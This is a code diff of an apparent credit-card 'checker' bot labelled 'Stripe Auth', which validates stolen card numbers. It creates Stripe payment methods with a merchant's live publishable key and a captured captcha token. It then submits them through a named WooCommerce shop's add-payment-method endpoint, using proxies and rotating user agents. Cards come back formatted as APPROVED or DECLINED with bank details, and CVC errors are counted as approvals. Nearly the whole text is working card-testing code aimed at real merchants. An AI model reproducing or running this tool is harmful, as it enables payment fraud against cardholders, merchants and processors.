WkZyYVVTK2V4UFF1TGRUL3NPcFRBUFYzZnd6UENyWG9wcmllUWxmdDUrR1A0eWR6ZXpidTJrWUcyRVBGditaVU5LUVhGdGkwNmNQMUdyTktEQzJ3d3l1bjREVDFoRnJ1ckl4M3pDclpyTzllVkg0RTJSd0dlM0V3ZWdHckV4dk5oV29Cd2ltSmhSTUZmNlBDQm5qREk3RE1kbExVRytXUzZReWxxUEsyVDFzY2FiOHFCTTZBRmV0eW1LV0g4UDgrSGoveXlRVFVyUUpFOFNXeFhyaDk5S0wrdDd0eUNWY2FwMjROUGVoTGQraWtRWWhCY2pDbXBUdzMwQUFqemhKTU1QSUlJd2w2WWFjSDlsY3lkK0RYR1NmY216ZWE2MkNCaGVIb05uQ0o5bmJ2ZDg2M2VDRjRHRVV1TWQ5TlM0WXEyMU5GakVJbmlMRHRvRlVKMWw5K2psMGNNaWdyWTFYbHBqa0QyVXdxUlVmT3NqU0ZGS1FSTzZ6ZFFnUjJRdzhuVkhacFM1MjNGbGdReWN2L2k0bFRRWHJjeVlvdThRd1lYUCtxdEQzS0wxM0JuV01DMThZU0RpTHBtVWtIRHBVNVhYS2lla0cwOHBsTXc5bGl3Tyt4TlhJNjJsbVg4TUM2QXZWdDZYRGt5RzRPN3FZUyt5NlpPd01memxXM1VQUzBZR0c1cEFDMW53NktnZytFZG1MNmIxRFZQM3hOa2JoOExZdFMyUTZKVkhPSXZuV0VKT0ptYVpFOWZvTHpNRTBrSGtaU2Nhd00yTFZ0S0FrNDN2dk9PVjdrdkM5LzBQcUg5ZGVsK2lJYUdaYTVRM1V2VDY2MTUrc2dxK2VxdmpPb202WitaZVlKR2liSFFTQ0FiSEkxcERiVittbTg3RTdmMFpZSzJsVEI0ZnBUbk5DYk1vQmtHd2dVa01nTndMQlVscTBBcGFKWUx5akFWMTJnNWdITG1lT3BYK1F2QlczZXYwTzdFY2k1c3FJSHplNGxBbU5aTWdHMVByZEhlUElQcHM0b0srK3UxeWtCdWxxOWRaQWk4RjgwcDNVamdGY2RQMlZPblVSMkk5TytmZlVuRWlSNU8yYUFUTGlVU0hRM0ZGOU9OYnpIZnl2d2x4KzZEZjQwdEVjWC9kcEtRNEpKdDdjNWxDY1IvUXk3dS9IVktIcjhIQkFzS0NRbUo0S2FqQ2hrcTFDdzUxWkZmM2hRSE5wNkV1NFhnNkZzRytTbzk3bjZjb1AxK0lCalV2YmlIYkpVS3pkbEdtUGJ6Q2hLWDJYczRtbnBybUdWSGx2SFVUdEZPY0FXT0FSdXIwb2JVNTlOVEVIcmJGbW9acStrMnVkQjRJcVBDMGQwYkVYZnpIRHZuNExUWVFid253VjhpV0xId3VDL1pUclJwZHh0UEhRMTlVa2d6SjE0d3RJOTdYSE1zOEQvY3VYQ3JMcE95SytGb0lrZ2IwdmpqZFBmd2RnNjJacmpxdlQ3ci9ubHd0YnlnNjI0VFREWTRXcWxiN7UvaE43cm9VWUtHY2Y4QzBoTmVyZlE9PSIsImtyIjoiNDRhZDI3ZWIiLCJzaGFyZF9pZCI6MjU5MTg5MzU5fQ.Jf8qLYQsSgafctzKuBltpNpAQpAihunT3fQ8fg4YI6o'
+        # Get payment nonce
+        ajax_nonce, nonce_msg = get_payment_nonce(session, proxy_str)
+        if not ajax_nonce:
+            elapsed_time = time.time() - start_time
+            return f"""
+DECLINED CC ❌
 
-            proxies = parse_proxy(proxy_str)
-            
-            response = stripe_api_call_with_retry('https://api.stripe.com/v1/payment_methods', stripe_headers, stripe_data, proxies)
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment nonce failed
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
-            # Check if response has 'id' before extracting
-            response_data = response.json()
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
+🏛️𝗕𝗮𝗻𝗸: UNKNOWN
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+
+        # Prepare Stripe data with the current card
+        data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2Fa28b4dac1e%3B+stripe-js-v3%2Fa28b4dac1e%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Ffirstcornershop.com&time_on_page=41633&client_attribution_metadata[client_session_id]=836082a4-1c37-4290-a02a-3f1dde89135c&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=a41e2cfe-3af5-43d5-a562-0bc5fce1e766&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=8f53025c-03c7-44c5-9cbb-1a0b63ff30bfdd29b1&muid=47719103-3bce-4e07-95e9-d05596324525dd3f1f&sid=f2951355-ac05-40c7-ae5d-51ae69d2656c59555c&key=pk_live_51KnIwCBqVauev2abKoSjNWm78cR1kpbtEdrt8H322BjXRXUvjZK2R8iAQEfHPEV9XNOCLmYVADzYkLd96PccE9HN00s4zyYumQ&_stripe_version=2024-06-20&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzYzNDM5OTIxLCJjZGF0YSI6Ik42NGpZQWtYUUdyVnlGT25YM0JWcmNxOGRkVlpIKzJxdnVCTHROVWk5MzBNZVZ1ano4NFlrY3JQaGh6UWRBejdZR3Bwa3JGVFFUdlFCajhlVmo2RDhqM3ExQXY1eElwdVdaVG5COFNGT0l2WkJxZnh3SUUzUXRnTEpoVWR1aHpCUmNuYytiTTRadytNTHg1NXJ1TUhnUm9IbUFKWEdObjhsM1BDdmREc3ZVd2krQ25wa1d6eUV6THU2bE9JUElETURuVCtJMUJYQlhBSGgzbVgiLCJwYXNza2V5IjoiR2NpS0tUeElDeWczbDNNU2ZrY0xUaXpnYUdFMkFiUk4yVURwNEVONWRwZEhiZEVZd1dnNWVML0NLREthQ3pjQlE4amtoSFhZR0hFbXNkSVlzUzhncGxJUkxKOHRmSmx5ODl6eTcwK3ZuWkxQVmdoQ3JUUlE1blhST3BCOEo3VitVUG5GdngvOTNneDBlcjVBKy96SzJIZUI5NTFObWJyZnNwaHZaRUdzcmZIWmw5WmZHdVYwckVRd3duNkVmUk9aWEw2WlZtR0hvcjRCL0N0QTJlTWVyWjd4ZTZjMnlPZ0ZoRllNNXBMQi9kRktQZWtVWFl2MUZYeEp1d21WNzFJK3Q5eThjU1FMb3VZZVpFSXZuZ3ZoM2xvNktLaWZDOERtenZSS2VxSkpGenY4N0ZJTFZpQ21scjdaZGhhWTcrdWozYmo2QzQ1QmN0eDlZd1dCN0ZMb29BMGNOUUo1TXQzZnVEVkU5SWw1REhrMmk3MGtJdFlVb1ZWcktQdlRwVGlPSUxoMi9NSmphOUlHZTdndHJKSlZiNm44QzI0T1B0ZmJuMG5QVWkrZFRlVTFiaXB4dDRoLzREV0xTckZDdVdPQWRySnlSZlhDRjNUUzJyZVl3aE8xMkVJYjNvNTRUQStaaTZaVC9obDQvMGhnalNvNHNwUEZ0dXNTWFplemRFTU5OOXZwMTBZVE5vLzNFTm5IUW05aDIxMitTUGNiSDh1S0xvODA4akFaalhiaFA3N1JVbDNKbW5HY2NYcVk3YjAzVWt4WUlLM0lXVFM0TkVuNDBva3UwTTFGSW1BUlByYTBuWS9UbEZXK2xSN25QY1F6VE5BeU5penlrbTVpckNmZGNCOVJDY0lZTVA3TUtMdUJLRGhxUWtFWWRDQWVBaDhkb0xJWW96b1RZdXFoRFJjZXRNUXE5dSsyN3FVVE51cDl6Q2ZLcDFGSlduRkRMM2tmbW1uWXZJZTNVY0wyR0ZUcVFlalIvSmJudllWRFR2alBxNnFBemlPTnNseG00bG80NmN2RHJHd2hCWEJqR2wyQjBxN215WVBXbytnMFhKa1FTQ0xiVlFpbG9zL3ZnZm5rZ3FFWVAyamNMbVV4Q0lUYWdrcVVyU3pBUTJmdGd2T2d2NXJOWjZWclFJWjRMdnRwbSt0RzNuUm1TdUlUNTBJY0hsVm02YitSNjIzdEo0ZzNrTzBuSk5FT1d5U3E3bGZvbm9MbDBET1Rpby9KNi90N3FHT0NRR05xdDlESldOWUxIdDFycDJTZDhCMS9IT1J1bmV4Vm1GcHRYSDE3c1JwdUd1S3FwSWQyK0RsOTBvMjAyc1JvQW9RbmlOL1N5YWdZck9TMGpaWkF6U3lHa2JLaElZdXpUU1QxaHdQU3h1elhQSUxYVzZkUmNUeHRGTk9qR1RJY2VpSzdINDZkRnlKTjBETm9VQlB0cU9uOURobkdkWEpRRzJQRHdMRmdGZTNmdHVFUkljd0JES0E0bnpnSmpLdzh0LzZLQldab3F1bWhnRUNiYkZITFppM2hMTHZRMzFuZ05lb3dYcm5BdFY5YVA2SkhQYXhZdGxBT0ZaOGY2YzMxZUpwVTgwSUpiYlN1eGc5RGNndFViVm05T3JIMmlKYU1xQnJrckMzZVJVNVpEalEyRE1JaVo2elBNaU16RHFBcm5EclU3RjdxYXV4ejdkNEFsTXVTbEJqWndaaCtBemxyZUhYQ1hDTjNNUVNuZzdjWVJXVTFPcVhoeHhHTjhqQlNxdDg4ajYyR0NHakJCSnJIdzM4MUthR2wzUjNBSUJzKzVSdHBJZFhXdlltTHQ4U3JtRGloSWtkbGZ0eUY3Y1JWcjRTa1BCeE1FNEhqOWs1VnJkeWxhQjRYR2txcnRLMU00UnRhdnRuZUVJbXFvWUxvSW5PVDVGekxUelYyR3k0RjB5R2RMYmFlR2Zwd2ZiTjFZZFRNVS9ET0lkQ2FyWlo5M29GRDJKR3ZYQks0ZFlyMUExNmlUZW04ODRMWUZtU2VIVFVReENONlZOVjUyS1ZCaHJLanUvZXlhRDZvVVhZYmN3SFlCZ3NZaGJEZHBRbHRpUlBFZHlSMzAzQ0tRK05FNGZNQ2NucmU3ZFUwMGFHcUZHemp5L2srR2VLck9JSXluSEZoQStUcWtRRTlNaU9rUGhTeHJEOXNEa2pidVkwWGsxYkxVMmgvbVpJb1UwYy91ZUxlM3JnQjVzSUdWTDl6dndSbXdZbTdGZG1GSGhzdlZhN1h1Q1FQVkxCQzM4V3c5MjRaMFJHNzhXbjdRWmVuZzM1ZlVHdmhZQlZMNi9GTkZLOVh4UkF2V08yTVNLRVJEM0VjcnJxbmtMb0p5WUhUaXlDMVhnekRVNmRTZnVSRWFZcFVxWjNTbVJCRWltVFdUSUpvOFBpM0srZERabTA3Q2RkeTd4dSttNVZQcFZ1Z3FjalFTYU1jbnZyL3J0THppVzNmR29mbFM2L2pvNFZSeU1SWHkycmZOS01IWEJiVllSRDNSQU1nbjJ4TjNkZ252b3BTeUc3Y1ZrdERqc3FKaGszNEg2L0FxTVcydENuc1FRcFR2UGFJamlwcHZ4a2llSzVKcWFwWDgxdkRFQmkrNFJ2NHlmNWJUQT09Iiwia3IiOiJhYjVhMTM4Iiwic2hhcmRfaWQiOjI1OTE4OTM1OX0.OJHabXwDS20gVBBjb-c6QtoBw3upH9H8xm0mpuek6mA'
+
+        proxies = parse_proxy(proxy_str)
+        
+        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=data, proxies=proxies, timeout=30)
+
+        # Check if response has 'id' before extracting
+        response_data = response.json()
+        
+        if 'id' in response_data:
+            pm_id = response_data['id']
             
-            if 'id' in response_data:
-                pm_id = response_data['id']
-                print(f"✅ Payment method created successfully: {pm_id}")
+            # Second request (admin ajax)
+            headers2 = {
+                'accept': '*/*',
+                'accept-language': 'en-US,en;q=0.6',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'origin': 'https://firstcornershop.com',
+                'priority': 'u=1, i',
+                'referer': 'https://firstcornershop.com/my-account/add-payment-method/',
+                'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
+                'sec-ch-ua-mobile': '?0',
+                'sec-ch-ua-platform': '"Windows"',
+                'sec-fetch-dest': 'empty',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-site': 'same-origin',
+                'sec-gpc': '1',
+                'user-agent': get_rotating_user_agent(),
+                'x-requested-with': 'XMLHttpRequest',
+            }
+
+            data2 = {
+                'action': 'wc_stripe_create_and_confirm_setup_intent',
+                'wc-stripe-payment-method': pm_id,
+                'wc-stripe-payment-type': 'card',
+                '_ajax_nonce': ajax_nonce,
+            }
+
+            response2 = session.post('https://firstcornershop.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', headers=headers2, data=data2, proxies=proxies, timeout=30)
+            website_response = response2.json()
+            
+            # Extract setup intent ID for 3DS check
+            setup_intent_id = None
+            if website_response.get('success'):
+                data_section = website_response.get('data', {})
+                setup_intent_id = data_section.get('id')
+            
+            # Get final message with 3DS info
+            final_message = get_final_message(website_response, proxy_str)
+            
+            elapsed_time = time.time() - start_time
+            bin_info = get_bin_info(n[:6])
+            
+            # Check the actual status from the response
+            if website_response.get('success'):
+                data_section = website_response.get('data', {})
+                status = data_section.get('status', '')
                 
-                # Now we need to complete the actual website flow to get real responses
-                # Let's try to get the actual payment page and submit the payment method
-                print("Step 2: Submitting payment method to website...")
-                
-                # Get the payment method page to find the actual form
-                payment_page = session.get('https://theherocollectibles.com/my-account/add-payment-method/', proxies=proxies, timeout=15)
-                
-                # Try to find any form or nonce in the page
-                # Look for WooCommerce nonce or any form data
-                nonce_match = re.search(r'name="woocommerce-add-payment-method-nonce" value="([^"]+)"', payment_page.text)
-                if nonce_match:
-                    wc_nonce = nonce_match.group(1)
-                    
-                    # Submit the payment method form
-                    form_data = {
-                        'woocommerce-add-payment-method-nonce': wc_nonce,
-                        '_wp_http_referer': '/my-account/add-payment-method/',
-                        'payment_method': 'stripe',
-                        'stripe_payment_method': pm_id,
-                        'stripe_source_id': pm_id,
-                        'wc-stripe-payment-method': pm_id,
-                        'action': 'woocommerce_add_payment_method',
-                        'payment_method': 'stripe'
-                    }
-                    
-                    # Submit the form
-                    submit_response = session.post('https://theherocollectibles.com/my-account/add-payment-method/', 
-                                                 data=form_data, proxies=proxies, timeout=15, allow_redirects=True)
-                    
-                    # Check the response for actual error messages
-                    if 'card was declined' in submit_response.text.lower():
-                        final_message = "Your card was declined."
-                    elif 'insufficient funds' in submit_response.text.lower():
-                        final_message = "Your card has insufficient funds."
-                    elif 'invalid' in submit_response.text.lower():
-                        final_message = "Your card is invalid."
-                    elif 'security code' in submit_response.text.lower() or 'cvc' in submit_response.text.lower():
-                        final_message = "Your card's security code is incorrect."
-                    elif 'success' in submit_response.text.lower() or 'added' in submit_response.text.lower():
-                        final_message = "Payment method successfully added."
-                    else:
-                        # If we can't parse specific message, use generic
-                        final_message = "Card processed - check response"
-                        
-                else:
-                    # If no nonce found, use the Stripe response to determine status
-                    if 'error' in response_data:
-                        error_msg = response_data['error'].get('message', 'Declined')
-                        final_message = error_msg
-                    else:
-                        final_message = "Payment method tokenized - awaiting verification"
-                
-                elapsed_time = time.time() - start_time
-                
-                # Determine if approved or declined based on the actual response
-                if any(success_term in final_message.lower() for success_term in ['success', 'added', 'verified']):
+                if status == 'succeeded':
                     return f"""
 APPROVED CC ✅
 
@@ -717,7 +497,22 @@ APPROVED CC ✅
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
 🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                elif status == 'requires_action':
+                    return f"""
+APPROVED CC ✅
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -732,19 +527,53 @@ DECLINED CC ❌
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
 🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
-                    
             else:
-                if retry_count < max_retries - 1:
-                    print(f"Stripe validation failed, retry {retry_count + 1}/{max_retries}")
-                    time.sleep(1)
-                    continue
-                elapsed_time = time.time() - start_time
+                # Check for specific error messages that should be treated as APPROVED
+                error_data = website_response.get('data', {})
+                if 'error' in error_data:
+                    error_msg = error_data['error'].get('message', '').lower()
+                    
+                    # Treat these errors as APPROVED
+                    if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
+                        return f"""
+APPROVED CCN ✅
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                
                 return f"""
+DECLINED CC ❌
+
+💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
+🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
+💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
+
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
+🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
+🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
+
+🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
+"""
+                
+        else:
+            elapsed_time = time.time() - start_time
+            bin_info = get_bin_info(n[:6])
+            return f"""
 DECLINED CC ❌
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
@@ -753,30 +582,24 @@ DECLINED CC ❌
 
 📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
 🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '🏳️')}
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
 """
 
-        except Exception as e:
-            if retry_count < max_retries - 1:
-                print(f"Request failed with error: {str(e)}, retry {retry_count + 1}/{max_retries}")
-                time.sleep(1)
-                continue
-            elapsed_time = time.time() - start_time
-            # Get BIN info even for errors to ensure we have it
-            bin_info = get_bin_info_reliable(cc_line.split('|')[0][:6]) if '|' in cc_line else get_fallback_bin_info('')
-            return f"""
+    except Exception as e:
+        elapsed_time = time.time() - start_time
+        return f"""
 ERROR ❌
 
 💳𝗖𝗖 ⇾ {cc_line}
 🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Request failed: {str(e)}
 💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1
 
-📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info.get('brand', 'UNKNOWN')} - {bin_info.get('type', 'UNKNOWN')} - {bin_info.get('level', 'UNKNOWN')}
-🏛️𝗕𝗮𝗻𝗸: {bin_info.get('bank', 'UNKNOWN')}
-🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info.get('country', 'UNKNOWN')} {bin_info.get('emoji', '')}
+📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: UNKNOWN - UNKNOWN - UNKNOWN
+🏛️𝗕𝗮𝗻𝗸: UNKNOWN
+🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: UNKNOWN 🏳️
 🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]
 
 🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
@@ -788,7 +611,7 @@ def check_cards_stripe(cc_lines):
     for cc_line in cc_lines:
         result = check_card_stripe(cc_line)
         results.append(result)
-        time.sleep(1)
+        time.sleep(2)  # Delay between checks
     return results
 
 # For standalone testing
